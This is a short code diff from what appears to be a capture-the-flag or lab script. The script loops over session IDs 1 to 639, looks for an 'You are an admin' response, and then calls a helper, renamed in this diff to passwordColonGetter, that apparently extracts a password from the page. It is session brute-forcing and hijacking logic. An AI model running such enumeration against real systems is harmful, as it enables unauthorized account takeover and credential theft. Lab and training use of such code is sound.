@@ -14,5 +14,5 @@ for seesionid in range(1, 640):
         # print(r.text)
         if "You are an admin" in r.text:
             print(f"Admin session id: {seesionid}")
-            Auther.semicolonGetter(r.text, 20)()
+            Auther.passwordColonGetter(r.text, 20)()
             break
